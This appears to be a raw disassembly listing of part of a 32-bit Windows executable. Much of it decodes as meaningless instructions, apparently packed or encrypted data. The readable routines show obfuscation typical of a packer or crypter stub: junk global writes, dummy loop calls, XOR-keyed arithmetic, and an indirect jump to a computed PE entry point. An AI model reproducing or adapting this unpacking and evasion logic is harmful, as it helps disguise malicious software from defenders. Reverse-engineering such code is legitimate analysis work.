  40616e:	sbb    dl,BYTE PTR [edx+0x356f378e]
  406174:	cmp    ch,BYTE PTR [ebp-0x26e66066]
  40617a:	add    DWORD PTR [ecx+0x6204035b],ebx
  406180:	ins    DWORD PTR es:[edi],dx
  406181:	jo     0x406134
  406183:	test   DWORD PTR [ebp-0x1568dc5f],esp
  406189:	sub    eax,0xcfa749c7
  40618f:	out    0x8a,al
  406191:	mov    ch,0x12
  406193:	mov    cl,bh
  406195:	in     eax,0xc7
  406197:	mov    ebp,0xf850ef18
  40619c:	cvttps2pi mm3,QWORD PTR [edx]
  40619f:	mov    ch,0x40
  4061a1:	adc    al,0xfc
  4061a3:	iret   
  4061a4:	sahf   
  4061a5:	lea    si,[esi+ebp*1+0x1393844d]
  4061ad:	shl    DWORD PTR [ebp+eax*8-0x70],1
  4061b1:	or     eax,0x2b858b3d
  4061b6:	and    eax,DWORD PTR [ecx+eax*1]
  4061b9:	pop    es
  4061ba:	retf   
  4061bb:	div    BYTE PTR [ecx-0x5d29c59f]
  4061c1:	pop    edx
  4061c2:	push   edx
  4061c3:	jp     0x4061ee
  4061c5:	(bad)  
  4061c6:	xchg   ebp,eax
  4061c7:	sbb    BYTE PTR [eax],0xfb
  4061ca:	mov    edi,0xcfadef7
  4061cf:	or     esp,esi
  4061d1:	not    eax
  4061d3:	inc    edx
  4061d4:	inc    ebp
  4061d5:	pop    esp
  4061d6:	fmul   QWORD PTR [ebp+ebx*8-0x70309990]
  4061dd:	pop    es
  4061de:	sub    DWORD PTR [edi],esi
  4061e0:	imul   edi,ebp,0xffffffd6
  4061e3:	repz js 0x406234
  4061e6:	mov    WORD PTR [ebx-0x18a004e3],?
  4061ec:	psubusw mm4,QWORD PTR [ecx+0x5e171947]
  4061f3:	imul   ecx,DWORD PTR [esi-0x74],0xc
  4061f7:	ret    
  4061f8:	mov    dh,0x1c
  4061fa:	mov    cl,0x5c
  4061fc:	aam    0x3
  4061fe:	shl    BYTE PTR [ecx+ecx*8+0x21265740],1
  406205:	and    BYTE PTR [ebp-0x485be335],bh
  40620b:	popa   
  40620c:	dec    ebx
  40620d:	xchg   esp,eax
  40620e:	nop
  40620f:	les    edx,FWORD PTR [ebx-0x3e]
  406212:	cmp    al,al
  406214:	adc    DWORD PTR [edx],eax
  406216:	push   ecx
  406217:	push   ebx
  406218:	add    eax,0xa2bad3a1
  40621d:	xchg   DWORD PTR [ecx],esp
  40621f:	stos   DWORD PTR es:[edi],eax
  406220:	jg     0x4061ed
  406222:	xor    al,0xbd
  406224:	mov    cl,0xe1
  406226:	adc    ecx,esp
  406228:	xor    eax,0x6cb0ab43
  40622d:	cmp    al,0x1b
  40622f:	pop    ss
  406230:	dec    esi
  406231:	je     0x406222
  406233:	outs   dx,DWORD PTR ds:[esi]
  406234:	xchg   BYTE PTR [ecx],ah
  406236:	(bad)  
  406237:	clc    
  406238:	mov    ah,0xf1
  40623a:	inc    ebp
  40623b:	push   edx
  40623c:	ja     0x406236
  40623e:	jl     0x406240
  406240:	dec    ebx
  406241:	repnz cmp ebx,esp
  406244:	test   eax,0x41786228
  406249:	xor    BYTE PTR [eax],bl
  40624b:	push   ebp
  40624c:	repz aas 
  40624e:	jns    0x406260
  406250:	xchg   BYTE PTR [edi-0x6a],dl
  406253:	or     ebx,edx
  406255:	popa   
  406256:	into   
  406257:	push   ebp
  406258:	in     eax,dx
  406259:	ret    
  40625a:	ret    
  40625b:	out    0xae,eax
  40625d:	mov    edx,DWORD PTR [ebx]
  40625f:	inc    esi
  406260:	sbb    esi,DWORD PTR [eax]
  406262:	cs hlt 
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	(bad)  
  406312:	arpl   WORD PTR [esi+0x7e3f54ef],bx
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x4062e6
  40631e:	or     edx,DWORD PTR [edx-0x38]
  406321:	dec    ebx
  406322:	loopne 0x406370
  406324:	call   0x40e8:0xd3de4269
  40632b:	or     eax,0xe9215655
  406330:	or     BYTE PTR [edx+0x40541c37],bh
  406336:	test   eax,0x44194ee6
  40633b:	mov    ch,BYTE PTR [ebx]
  40633d:	dec    ecx
  40633e:	xor    bh,ch
  406340:	hlt    
  406341:	sub    al,0x54
  406343:	es gs (bad) 
  406347:	and    eax,DWORD PTR [esi]
  406349:	cld    
  40634a:	std    
  40634b:	jl     0x406377
  40634d:	cs call 0x3e46:0x2b62dc23
  406355:	xchg   ebx,eax
  406356:	out    0x9d,eax
  406358:	sahf   
  406359:	out    0xde,al
  40635b:	mov    al,0x69
  40635d:	pop    ecx
  40635e:	pop    DWORD PTR [edi]
  406360:	ja     0x4063db
  406362:	pop    esp
  406363:	or     al,BYTE PTR [eax-0x13]
  406366:	gs in  eax,dx
  406368:	jno    0x406386
  40636a:	call   0xceba9a24
  40636f:	aad    0x1e
  406371:	jecxz  0x406304
  406373:	or     DWORD PTR [ebx-0x4d],edi
  406376:	fsub   st,st(4)
  406378:	push   0x73
  40637a:	push   edx
  40637b:	jle    0x4063af
  40637d:	or     esi,esi
  40637f:	ins    DWORD PTR es:[edi],dx
  406380:	fwait
  406381:	addr16 and eax,0x3cd53cfc
  406387:	jno    0x406406
  406389:	test   al,0x96
  40638b:	fisttp DWORD PTR gs:[ecx+0x5ab21f27]
  406392:	mov    edx,0x5ecdda54
  406397:	sbb    al,0x87
  406399:	cli    
  40639a:	dec    edi
  40639b:	daa    
  40639c:	mov    esp,0x97c60953
  4063a1:	xchg   ebx,eax
  4063a2:	rcl    esi,1
  4063a4:	mov    edx,0x903057a0
  4063a9:	dec    edi
  4063aa:	adc    BYTE PTR [esi-0x6d],dh
  4063ad:	pushfw 
  4063af:	int3   
  4063b0:	outs   dx,DWORD PTR ds:[esi]
  4063b1:	add    al,0xf1
  4063b3:	cdq    
  4063b4:	or     esi,DWORD PTR [eax+0x38]
  4063b7:	and    BYTE PTR [ebp+0x2b437519],0x73
  4063be:	sub    dh,al
  4063c0:	xchg   esp,eax
  4063c1:	cwde   
  4063c2:	cmp    eax,0xae761506
  4063c7:	test   eax,0xd570a96
  4063cc:	(bad)  [edi]
  4063ce:	sbb    al,0x71
  4063d0:	outs   dx,BYTE PTR ds:[esi]
  4063d1:	push   eax
  4063d2:	lods   al,BYTE PTR ds:[esi]
  4063d3:	xor    DWORD PTR [edi],ebp
  4063d5:	add    al,0xa2
  4063d7:	or     DWORD PTR [edi+ecx*2-0x79],ebp
  4063db:	mov    eax,0xd882623c
  4063e0:	pop    ss
  4063e1:	mov    ds:0x8e00c0c,eax
  4063e6:	test   eax,0x6066aa13
  4063eb:	xchg   esi,eax
  4063ec:	arpl   WORD PTR [ebx+0x39],di
  4063ef:	mov    al,0x72
  4063f1:	adc    BYTE PTR [ebx+eax*4],ah
  4063f4:	mov    edx,0x2e7786d2
  4063f9:	das    
  4063fa:	xchg   ebp,eax
  4063fb:	jnp    0x40638f
  4063fd:	loop   0x4063eb
  4063ff:	loop   0x406476
  406401:	dec    ebx
  406402:	lea    eax,[esi-0x45ec51f7]
  406408:	(bad)  
  406409:	test   al,0x8
  40640b:	arpl   WORD PTR [eax],bx
  40640d:	sub    al,0x48
  40640f:	scas   al,BYTE PTR es:[edi]
  406410:	dec    ebx
  406411:	fisubr DWORD PTR [esi-0x74fd4c9e]
  406417:	hlt    
  406418:	loop   0x406461
  40641a:	mov    ecx,0xc5d4ab63
  40641f:	cli    
  406420:	xchg   esi,eax
  406421:	dec    esp
  406422:	clc    
  406423:	aaa    
  406424:	icebp  
  406425:	push   edi
  406426:	sub    bh,BYTE PTR [edi+0x38]
  406429:	or     dl,BYTE PTR [edi-0x14]
  40642c:	ror    DWORD PTR [esi-0x6c],cl
  40642f:	adc    al,0x2f
  406431:	xor    BYTE PTR [ebx],0xce
  406434:	jmp    0x465342c2
  406439:	mov    ebx,DWORD PTR [ebx]
  40643b:	jnp    0x406498
  40643d:	add    eax,0x85c66f3a
  406442:	xchg   edx,eax
  406443:	inc    ebx
  406444:	lds    edx,FWORD PTR [eax-0xc]
  406447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406448:	xchg   edx,eax
  406449:	aad    0x78
  40644b:	adc    ebx,DWORD PTR [ecx]
  40644d:	js     0x4063f9
  40644f:	mov    ebx,0x30d0f8f4
  406454:	std    
  406455:	fsub   QWORD PTR ds:0xfd6896a8
  40645b:	pop    ds
  40645c:	mov    dl,0xb1
  40645e:	retf   0x23b8
  406461:	adc    DWORD PTR [ecx+0x5a],ecx
  406464:	mov    ch,0x82
  406466:	ja     0x4064b0
  406468:	xor    bh,bl
  40646a:	cmp    al,0x87
  40646c:	daa    
  40646d:	fwait
  40646e:	shl    al,0x57
  406471:	sbb    DWORD PTR [esi-0x3f],esi
  406474:	sub    dl,BYTE PTR [ebx+eiz*1]
  406477:	add    DWORD PTR [edx+0x4d],esi
  40647a:	jg     0x40647c
  40647c:	or     cl,dl
  40647e:	js     0x40642f
  406480:	mov    WORD PTR [edi+0x56],gs
  406483:	fnstsw WORD PTR [esi-0x46]
  406486:	retf   
  406487:	call   0x1330:0xbc3a66df
  40648e:	push   ss
  40648f:	mov    bh,0x5f
  406491:	int    0x4
  406493:	ror    DWORD PTR [edi+ebp*1],0xd6
  406497:	je     0x40649e
  406499:	js     0x40650a
  40649b:	mov    dl,0xa0
  40649d:	rcr    edi,1
  40649f:	xchg   esp,eax
  4064a0:	neg    esi
  4064a2:	jmp    0x406428
  4064a4:	aaa    
  4064a5:	mov    ds:0xdd4360d7,al
  4064aa:	in     eax,0x29
  4064ac:	int3   
  4064ad:	mov    bh,0xbd
  4064af:	or     ah,bl
  4064b1:	dec    ebx
  4064b2:	mov    fs,WORD PTR [eax-0x31]
  4064b5:	mov    ds:0xb4c569d4,eax
  4064ba:	jl     0x406473
  4064bc:	(bad)  
  4064bd:	(bad)  
  4064be:	fucomi st,st(1)
  4064c0:	mov    eax,ds:0x85d2d9d
  4064c5:	sbb    eax,0x8c43e774
  4064ca:	xor    edi,0x9fb2c3fa
  4064d0:	call   FWORD PTR [eax-0x32ebc133]
  4064d6:	jne    0x406503
  4064d8:	out    0x39,eax
  4064da:	cli    
  4064db:	push   ss
  4064dc:	mov    eax,ds:0x68cd7370
  4064e1:	jmp    0xf4154ee9
  4064e6:	(bad)  
  4064e7:	and    edx,ecx
  4064e9:	outs   dx,DWORD PTR ds:[esi]
  4064ea:	inc    ebp
  4064eb:	mov    edx,0x3cca6b7b
  4064f0:	test   al,0x54
  4064f2:	cmc    
  4064f3:	xor    bh,dl
  4064f5:	int3   
  4064f6:	test   eax,0x714ceb56
  4064fb:	leave  
  4064fc:	sbb    DWORD PTR [ebp+0x49bbc997],eax
  406502:	xchg   ebx,eax
  406503:	dec    ebp
  406504:	cmp    DWORD PTR [edi+0x3a],esi
  406507:	add    DWORD PTR [edx-0x477954c4],eax
  40650d:	push   edi
  40650e:	pop    ebx
  40650f:	and    BYTE PTR [esi+0x3a2bb692],bl
  406515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406516:	mov    ah,0x54
  406518:	iret   
  406519:	inc    edi
  40651a:	mov    al,0xd
  40651c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40651d:	or     DWORD PTR ds:0xb799fd52,0x57
  406524:	jmp    0x4064e2
  406526:	pop    edx
  406527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406529:	in     al,0xbe
  40652b:	pop    es
  40652c:	enter  0x2337,0xa9
  406530:	sbb    DWORD PTR [edx-0x709abb03],edi
  406536:	mov    cl,0x4c
  406538:	add    ecx,ebx
  40653a:	add    eax,0x40fa38c
  40653f:	or     BYTE PTR [edi+0x4d],dh
  406542:	(bad)  
  406543:	jno    0x406521
  406545:	jns    0x4065a1
  406547:	or     DWORD PTR [ecx+0x470fac0f],eax
  40654d:	jmp    ebp
  40654f:	dec    ebp
  406550:	fisttp QWORD PTR [edi]
  406552:	sbb    BYTE PTR ds:0x16914586,0x35
  406559:	sbb    eax,0xdcc8565d
  40655e:	loopne 0x4064ed
  406560:	pop    ds
  406561:	aam    0xf0
  406563:	dec    ebp
  406564:	pop    edx
  406565:	loopne 0x406524
  406567:	std    
  406568:	in     al,0x58
  40656a:	add    dh,BYTE PTR [eax]
  40656c:	add    eax,0x47512327
  406571:	clc    
  406572:	pusha  
  406573:	scas   eax,DWORD PTR es:[edi]
  406574:	mov    esp,esp
  406576:	cmp    al,BYTE PTR ds:0x381a39f1
  40657c:	out    0x8b,eax
  40657e:	and    BYTE PTR [ecx-0x2cbe4dff],bh
  406584:	xchg   DWORD PTR [eax],eax
  406586:	ret    
  406587:	add    DWORD PTR es:[esi+0x61acaffb],eax
  40658e:	add    al,0x4f
  406590:	(bad)  
  406591:	lock add edx,DWORD PTR [esi+0x73]
  406595:	nop
  406596:	ror    ch,1
  406598:	retf   0x34c9
  40659b:	test   edi,edx
  40659d:	inc    esi
  40659e:	xchg   edx,eax
  40659f:	sub    esi,DWORD PTR [esi-0x7160c962]
  4065a5:	cmp    bl,BYTE PTR [edi+0x13928b5e]
  4065ab:	call   0xe1a22119
  4065b0:	outs   dx,BYTE PTR ds:[esi]
  4065b1:	jno    0x4065ff
  4065b3:	add    al,0x70
  4065b5:	sub    edi,edx
  4065b7:	dec    edi
  4065b8:	sbb    eax,0xab571044
  4065bd:	sti    
  4065be:	test   esp,ebx
  4065c0:	adc    bh,BYTE PTR [ebx+0x17]
  4065c3:	mov    ds:0xc8464408,eax
  4065c8:	es js  0x4065d9
  4065cb:	xor    ch,ch
  4065cd:	nop
  4065ce:	ins    BYTE PTR es:[edi],dx
  4065cf:	aas    
  4065d0:	jns    0x40663a
  4065d2:	ss dec esi
  4065d4:	pop    edi
  4065d5:	or     dl,BYTE PTR [ebp+0x54]
  4065d8:	clc    
  4065d9:	cli    
  4065da:	add    BYTE PTR [edi],bh
  4065dc:	push   ebp
  4065dd:	adc    DWORD PTR [edx],0x47cf0254
  4065e3:	pop    ecx
  4065e4:	sbb    eax,0xf48dfdf5
  4065e9:	icebp  
  4065ea:	enter  0xfb97,0x2d
  4065ee:	mov    ah,0x46
  4065f0:	xchg   BYTE PTR [eax-0x6d3f6619],dh
  4065f6:	cmc    
  4065f7:	xchg   edx,eax
  4065f8:	out    0xff,al
  4065fa:	in     al,dx
  4065fb:	jmp    0xd10:0x53915ff7
  406602:	or     bh,0xd5
  406605:	sub    BYTE PTR [ecx-0x5dc764e],bl
  40660b:	push   edx
  40660c:	mov    edx,edi
  40660e:	rol    ebp,0x50
  406611:	jg     0x406636
  406613:	lahf   
  406614:	sub    DWORD PTR [esi-0x2f5cd816],ecx
  40661a:	cmp    BYTE PTR [esp+eax*8+0x7b],dh
  40661e:	mov    ds:0xb989d4d4,al
  406623:	cwde   
  406624:	mov    bh,0x4b
  406626:	mov    ds:0x170c5081,eax
  40662b:	or     al,0x11
  40662d:	pop    esi
  40662e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40662f:	mov    bl,BYTE PTR [eax-0x5153ca52]
  406635:	xchg   edi,esi
  406637:	mov    ch,0x63
  406639:	scas   eax,DWORD PTR es:[edi]
  40663a:	xlat   BYTE PTR ds:[ebx]
  40663b:	mov    esi,0x7ba21282
  406640:	mov    ds:0xc3e3df3d,al
  406645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406646:	adc    dh,BYTE PTR [ebx+0x67]
  406649:	dec    ecx
  40664a:	out    dx,eax
  40664b:	stos   BYTE PTR es:[edi],al
  40664c:	test   al,0xd6
  40664e:	out    dx,eax
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
